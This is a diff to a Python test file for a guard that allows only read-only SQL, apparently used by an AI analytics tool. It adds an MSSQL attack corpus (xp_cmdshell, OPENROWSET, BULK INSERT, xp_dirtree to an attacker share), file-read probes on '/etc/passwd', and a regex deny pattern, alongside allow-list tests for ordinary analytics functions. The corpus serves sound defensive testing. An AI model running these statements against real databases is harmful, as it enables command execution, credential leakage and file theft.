@@ -110,14 +110,194 @@ def test_ordinary_mysql_analytics_is_not_over_blocked(sql):
     assert g.check_sql_readonly(sql, dialect="mysql") is None
 
 
-@pytest.mark.parametrize("dialect", ["postgres", "mysql", "sqlite"])
-def test_every_denied_function_is_refused_in_every_dialect(dialect):
-    """The deny check reads Anonymous nodes only: this proves every denied name (and a sample of
-    each denied prefix) still parses as one, so a sqlglot upgrade that types one fails here, not
-    in production (security review, 5.8a)."""
-    names = sorted(g._SQL_DENY_FUNCS) + [p + "x" for p in g._SQL_DENY_PREFIXES]
-    let_through = [n for n in names if g.check_sql_readonly(f"SELECT {n}(1)", dialect) is None]
-    assert let_through == []
+# SQL Server (5.8b). Shapes from PayloadsAllTheThings' MSSQL injection page (MIT) and the
+# red-team's probes: T-SQL runs procedures, reads files and other servers, waits and locks from
+# places a SELECT-only reading of the parse misses.
+MSSQL_ATTACKS = [
+    "DELETE FROM dbo.orders", "UPDATE dbo.orders SET a = 1", "DROP TABLE dbo.orders",
+    "TRUNCATE TABLE dbo.orders", "BULK INSERT dbo.t FROM 'c:/x.csv'", "DBCC CHECKDB",
+    "EXEC xp_cmdshell 'dir'", "EXECUTE sp_who", "EXEC('SELECT 1')", "SELECT 1; EXEC sp_who",
+    "EXECUTE AS LOGIN = 'sa'; SELECT 1", "WAITFOR DELAY '0:0:5'", "SELECT 1; WAITFOR DELAY '0:0:5'",
+    "SELECT a INTO newt FROM t", "SELECT a INTO #t FROM t",
+    "SELECT * FROM OPENQUERY(srv, 'SELECT 1')",
+    "SELECT * FROM OPENROWSET('SQLNCLI', 'server=x;trusted_connection=yes', 'SELECT 1')",
+    "SELECT * FROM OPENROWSET(BULK 'c:/x', SINGLE_CLOB) a",
+    "SELECT * FROM OPENDATASOURCE('SQLNCLI', 'Data Source=x').db.dbo.t",
+    "SELECT xp_dirtree('\\\\attacker\\share')", "SELECT xp_fileexist('c:/x')",
+    "SELECT NEXT VALUE FOR dbo.seq",
+    "SELECT * FROM t WITH (UPDLOCK)", "SELECT * FROM t WITH (TABLOCKX)",
+    "SELECT * FROM t WITH (HOLDLOCK)", "SELECT * FROM t WITH (XLOCK, ROWLOCK)",
+    "SELECT dbo.round(x) FROM t", "SELECT master.dbo.fn_varbintohexstr(0x1)",
+    "SELECT * FROM t CROSS APPLY sys.dm_exec_sql_text(t.h)",
+    "SELECT * FROM sys.fn_get_audit_file('c:/a', DEFAULT, DEFAULT)",
+    "SELECT * FROM t OUTER APPLY fn_xe_file_target_read_file('c:/x', NULL, NULL, NULL) f",
+    "SELECT SUSER_SNAME(), HAS_DBACCESS('x'), IS_SRVROLEMEMBER('sysadmin')",
+    "SELECT NEWID()", "SELECT ::fn_helpcollations()",
+]
+
+
+@pytest.mark.parametrize("sql", MSSQL_ATTACKS)
+def test_the_mssql_attack_corpus_is_rejected_by_the_parse_guard_alone(sql):
+    assert g.check_sql_readonly(sql, dialect="tsql"), sql
+
+
+@pytest.mark.parametrize("sql", [
+    "SELECT TOP 10 region, SUM(sales) AS s FROM dbo.orders GROUP BY region ORDER BY s DESC",
+    "SELECT DATEADD(month, DATEDIFF(month, 0, d), 0) AS m, COUNT(*) FROM t "
+    "GROUP BY DATEADD(month, DATEDIFF(month, 0, d), 0)",
+    "SELECT [Order Date], ISNULL(region, 'x') FROM [dbo].[orders]",
+    "SELECT * FROM t WITH (NOLOCK)",
+    "SELECT a, x.b FROM t CROSS APPLY (SELECT TOP 1 b FROM u WHERE u.a = t.a) x",
+    "SELECT FORMAT(d, 'yyyy-MM') AS m, STRING_AGG(s, ',') FROM t GROUP BY FORMAT(d, 'yyyy-MM')",
+    "SELECT a FROM t ORDER BY a OFFSET 0 ROWS FETCH NEXT 10 ROWS ONLY",
+    "SELECT IIF(a > 0, 1, 0), TRY_CAST(b AS INT), CONVERT(VARCHAR(7), d, 120) FROM t",
+    "SELECT EOMONTH(d), DATEFROMPARTS(2025, 1, 1), DATETRUNC(month, d) FROM t",
+    "SELECT PERCENTILE_CONT(0.5) WITHIN GROUP (ORDER BY x) OVER () FROM t",
+    "WITH x AS (SELECT 1 AS a) SELECT a FROM x",
+])
+def test_ordinary_mssql_analytics_is_not_over_blocked(sql):
+    assert g.check_sql_readonly(sql, dialect="tsql") is None
+
+
+# The analyst's function families (SQL:2016 core + each vendor's aggregate, math, string, date,
+# conditional, window and cast functions), one call each: what the allow list must let through.
+# Not from vendor names alone: sqlglot builds its own nodes from syntax and spellings (MySQL
+# DATE_FORMAT → TimeToStr + TsOrDsToTimestamp, T-SQL STRING_AGG → GroupConcat).
+ANALYST_FUNCTIONS = {
+    "*": ["COUNT(x)", "COUNT(*)", "COUNT(DISTINCT x)", "SUM(x)", "AVG(x)", "MIN(x)", "MAX(x)",
+          "ABS(x)", "CEIL(x)", "FLOOR(x)", "ROUND(x, 2)", "POWER(x, 2)", "SQRT(x)", "LN(x)",
+          "EXP(x)", "MOD(x, 2)", "SIGN(x)", "LOWER(s)", "UPPER(s)", "TRIM(s)", "LTRIM(s)",
+          "RTRIM(s)", "SUBSTRING(s, 1, 2)", "LENGTH(s)", "CONCAT(a, b)", "REPLACE(s, 'a', 'b')",
+          "COALESCE(a, b)", "NULLIF(a, b)", "CAST(x AS INT)", "CURRENT_DATE", "CURRENT_TIMESTAMP",
+          "CASE WHEN a > 1 THEN 1 ELSE 0 END", "a > 1 AND b < 2", "a > 1 OR b < 2", "NOT a > 1",
+          "EXISTS (SELECT 1)", "x IN (1, 2)", "x BETWEEN 1 AND 2", "x LIKE 'a%'", "x IS NULL",
+          "ROW_NUMBER() OVER (ORDER BY x)", "RANK() OVER (PARTITION BY a ORDER BY x)",
+          "DENSE_RANK() OVER (ORDER BY x)", "NTILE(4) OVER (ORDER BY x)",
+          "LAG(x) OVER (ORDER BY x)", "LEAD(x, 1) OVER (ORDER BY x)",
+          "FIRST_VALUE(x) OVER (ORDER BY x)", "LAST_VALUE(x) OVER (ORDER BY x)",
+          "PERCENT_RANK() OVER (ORDER BY x)", "CUME_DIST() OVER (ORDER BY x)",
+          "SUM(x) OVER (PARTITION BY a ORDER BY d ROWS BETWEEN 2 PRECEDING AND CURRENT ROW)"],
+    "postgres": ["DATE_TRUNC('month', d)", "DATE_PART('year', d)", "EXTRACT(YEAR FROM d)",
+                 "AGE(d)", "TO_CHAR(d, 'YYYY-MM')", "NOW()", "MAKE_DATE(2025, 1, 1)",
+                 "TO_DATE(s, 'YYYY')", "d + INTERVAL '1 month'", "d::date", "x::numeric",
+                 "PERCENTILE_CONT(0.5) WITHIN GROUP (ORDER BY x)",
+                 "PERCENTILE_DISC(0.5) WITHIN GROUP (ORDER BY x)",
+                 "MODE() WITHIN GROUP (ORDER BY x)", "STRING_AGG(s, ',')", "ARRAY_AGG(x)",
+                 "BOOL_AND(b)", "BOOL_OR(b)", "COUNT(*) FILTER (WHERE a > 1)", "INITCAP(s)",
+                 "LPAD(s, 3, '0')", "RPAD(s, 3, '0')", "POSITION('a' IN s)",
+                 "SPLIT_PART(s, ',', 1)", "LEFT(s, 2)", "RIGHT(s, 2)",
+                 "REGEXP_REPLACE(s, 'a', 'b')", "s ~ 'a'", "CORR(a, b)", "COVAR_POP(a, b)",
+                 "REGR_SLOPE(a, b)", "STDDEV(x)", "STDDEV_POP(x)", "STDDEV_SAMP(x)",
+                 "VARIANCE(x)", "VAR_POP(x)", "VAR_SAMP(x)", "GREATEST(a, b)", "LEAST(a, b)",
+                 "DATE(d)", "TRUNC(x)", "WIDTH_BUCKET(x, 0, 10, 5)", "j ->> 'a'", "j -> 'a'",
+                 "LOG(10, x)", "CHAR_LENGTH(s)", "pg_typeof(1)", "s ILIKE 'a%'"],
+    "mysql": ["DATE_FORMAT(d, '%Y-%m')", "YEAR(d)", "MONTH(d)", "DAY(d)", "QUARTER(d)",
+              "WEEK(d)", "DAYOFWEEK(d)", "DATE(d)", "DATEDIFF(a, b)", "TIMESTAMPDIFF(DAY, a, b)",
+              "DATE_ADD(d, INTERVAL 1 DAY)", "DATE_SUB(d, INTERVAL 1 DAY)", "LAST_DAY(d)",
+              "NOW()", "CURDATE()", "STR_TO_DATE(s, '%Y')", "IF(a > 1, 1, 0)", "IFNULL(a, b)",
+              "GROUP_CONCAT(s)", "GROUP_CONCAT(DISTINCT s ORDER BY s SEPARATOR ',')",
+              "LEFT(s, 2)", "RIGHT(s, 2)", "LOCATE('a', s)", "INSTR(s, 'a')", "LPAD(s, 3, '0')",
+              "TRUNCATE(x, 2)", "s REGEXP 'a'", "CONCAT_WS(',', a, b)", "MAKEDATE(2025, 1)",
+              "EXTRACT(YEAR_MONTH FROM d)", "JSON_EXTRACT(j, '$.a')", "JSON_UNQUOTE(j)",
+              "UNIX_TIMESTAMP(d)", "FROM_UNIXTIME(x)", "STD(x)", "STDDEV(x)", "VARIANCE(x)",
+              "GREATEST(a, b)", "LEAST(a, b)", "CHAR_LENGTH(s)", "LOG(10, x)"],
+    "tsql": ["DATEADD(day, 1, d)", "DATEDIFF(day, a, b)", "DATEPART(year, d)",
+             "DATENAME(month, d)", "YEAR(d)", "MONTH(d)", "DAY(d)", "EOMONTH(d)",
+             "DATEFROMPARTS(2025, 1, 1)", "GETDATE()", "SYSDATETIME()", "FORMAT(d, 'yyyy-MM')",
+             "CONVERT(VARCHAR(10), d, 120)", "TRY_CAST(x AS INT)", "TRY_CONVERT(INT, x)",
+             "IIF(a > 1, 1, 0)", "ISNULL(a, b)", "LEN(s)", "CHARINDEX('a', s)", "LEFT(s, 2)",
+             "RIGHT(s, 2)", "STRING_AGG(s, ',')", "STDEV(x)", "STDEVP(x)", "VAR(x)", "VARP(x)",
+             "COUNT_BIG(x)", "SQUARE(x)", "CHOOSE(1, a, b)", "DATETRUNC(month, d)",
+             "CEILING(x)", "CONCAT_WS(',', a, b)", "STR(x)", "PATINDEX('%a%', s)",
+             "JSON_VALUE(j, '$.a')", "SWITCHOFFSET(d, '+00:00')",
+             "TODATETIMEOFFSET(d, '+00:00')", "PERCENTILE_CONT(0.5) WITHIN GROUP (ORDER BY x) OVER ()",
+             "GREATEST(a, b)", "LEAST(a, b)", "LOG(x, 10)", "LOG10(x)", "s COLLATE Latin1_General_CS_AS"],
+    "sqlite": ["STRFTIME('%Y', d)", "DATE(d)", "DATETIME(d)", "JULIANDAY(d)", "IFNULL(a, b)",
+               "IIF(a > 1, 1, 0)", "SUBSTR(s, 1, 2)", "INSTR(s, 'a')", "GROUP_CONCAT(s)",
+               "TOTAL(x)", "PRINTF('%d', x)", "UNIXEPOCH(d)", "TIME(d)", "MAX(a, b)"],
+}
+
+
+@pytest.mark.parametrize("dialect", ["postgres", "mysql", "tsql", "sqlite"])
+def test_every_analyst_function_family_passes_the_allow_list(dialect):
+    refused = {f: r for f in ANALYST_FUNCTIONS["*"] + ANALYST_FUNCTIONS[dialect]
+               if (r := g.check_sql_readonly(f"SELECT {f} FROM t", dialect))}
+    assert refused == {}
+
+
+def _stored_sql() -> list[str]:
+    """Every query the model wrote in a stored eval report (the SQL eval and E2E runs), every SQL
+    eval case's golden/trap/previous query and every layer's verified query."""
+    import json
+    out: set[str] = set()
+
+    def walk(o):
+        if isinstance(o, dict):
+            for k, v in o.items():
+                if k == "sql" and isinstance(v, str):
+                    out.add(v)
+                walk(v)
+        elif isinstance(o, list):
+            for v in o:
+                walk(v)
+    for p in [*(ROOT / "evals/reports").glob("sql-*.json"), *(ROOT / "evals/reports").glob("e2e-*.json")]:
+        walk(json.loads(p.read_text()))
+    for c in CASES:
+        out |= {c[k] for k in ("golden_sql", "trap_sql", "previous_sql") if isinstance(c.get(k), str)}
+    for layer in LAYERS.values():
+        out |= {q.sql for q in layer.verified_queries}
+    return sorted(out)
+
+
+@pytest.mark.parametrize("dialect", ["postgres", "mysql", "tsql", "sqlite"])
+def test_every_stored_query_passes_the_allow_list_in_every_dialect(dialect):
+    """5.8b red-team B1: the allow list may not refuse what the model already writes (138 stored
+    model queries at 5.8b), read as Postgres and as each other dialect would write it."""
+    import sqlglot
+    corpus = _stored_sql()
+    assert len(corpus) >= 200
+    refused = {}
+    for sql in corpus:
+        text_ = sql if dialect == "postgres" else sqlglot.transpile(sql, read="postgres", write=dialect)[0]
+        if (reason := g.check_sql_readonly(text_, dialect)) and "write/DDL" not in reason:
+            refused[text_] = reason
+    assert refused == {}
+
+
+@pytest.mark.parametrize(("sql", "dialect"), [
+    ("SELECT read_csv('/etc/passwd')", "postgres"), ("SELECT uuid()", "mysql"),
+    ("SELECT rand()", "mysql"), ("SELECT random()", "postgres"), ("SELECT current_user", "postgres"),
+    ("SELECT session_user", "postgres"), ("SELECT version()", "mysql"),
+    ("SELECT my_fn(1)", "postgres"), ("SELECT nextval('s')", "postgres"),
+    ("SELECT pg_sleep(5)", "postgres"), ("SELECT dblink('x', 'y')", "postgres"),
+    ("SELECT lo_import('/etc/passwd')", "postgres"), ("SELECT pg_read_file('x')", "postgres"),
+    ("SELECT sleep(5)", "mysql"), ("SELECT load_file('/etc/passwd')", "mysql"),
+    ("SELECT connection_id()", "mysql"), ("SELECT database()", "mysql"),
+    ("SELECT public.lower(s) FROM t", "postgres"), ("SELECT load_extension('x')", "sqlite"),
+])
+def test_a_function_not_on_the_allow_list_is_refused(sql, dialect):
+    """The 5.8a deny list read unknown names only: a name sqlglot types (`NextValueFor`,
+    `Uuid`, `ReadCSV`, `CurrentUser`) never reached it, and each review found one more denied
+    name missing. Now anything off the list is refused, named."""
+    reason = g.check_sql_readonly(sql, dialect)
+    assert reason and "not allowed" in reason, (sql, reason)
+
+
+def test_nothing_that_reads_waits_locks_or_says_who_is_on_the_allow_list():
+    """The list is reviewed by hand; this keeps the obvious classes off it whatever is added."""
+    import re
+
+    from sqlglot import exp
+    risky = re.compile(r"read|file|sleep|lock|seq|next_?val|uuid|rand|user|session|role|version|"
+                       r"current(?!_?(date|time|timestamp))|connect|database|schema|catalog|"
+                       r"server|host|system|exec|url|http|load|copy|export|import|stage|query",
+                       re.I)
+    names = [c.__name__ for c in g._SQL_FUNCS]
+    assert [n for n in names if risky.search(n) and n not in
+            ("CurrentDate", "CurrentTimestamp", "CurrentTime", "CurrentDatetime")] == []
+    assert all(issubclass(c, exp.Func) for c in g._SQL_FUNCS)
+    named = sorted(n for names_ in g._SQL_NAMES.values() for n in names_ if risky.search(n))
+    assert named == []
 
 
 @pytest.mark.parametrize("sql", [
@@ -158,14 +338,16 @@ def test_the_sql_text_check_is_linear_on_hostile_text():
 
 def test_a_function_given_ordinary_text_is_allowed():
     assert g.check_sql_readonly("SELECT initcap('selection'), to_char(now(), 'YYYY')", "postgres") is None
-    # unknown functions given text that isn't a query: a word, nothing, a bracket, a lone quote
+    # allowed functions given text that isn't a query: a word, nothing, a bracket, a lone quote
     for text_ in ["selection", "", "(", "it''s"]:
-        assert g.check_sql_readonly(f"SELECT my_fn('{text_}')", "postgres") is None, text_
+        assert g.check_sql_readonly(f"SELECT to_char(d, '{text_}') FROM t", "postgres") is None, text_
 
 
 def test_sql_as_text_is_read_in_the_connections_dialect():
-    """MySQL's `#` starts a comment: the query after it is found only when read as MySQL."""
-    assert g.check_sql_readonly("SELECT my_fn('# c\nSELECT 1')", "mysql") is not None
+    """MySQL's `#` starts a comment: the query after it is found only when read as MySQL (an
+    allowed name, so only the text check can refuse it)."""
+    assert g.check_sql_readonly("SELECT json_unquote('# c\nSELECT 1')", "mysql") is not None
+    assert g.check_sql_readonly("SELECT json_unquote('# c')", "mysql") is None
 
 
 def test_the_catalog_rules_follow_the_dialect_rows():
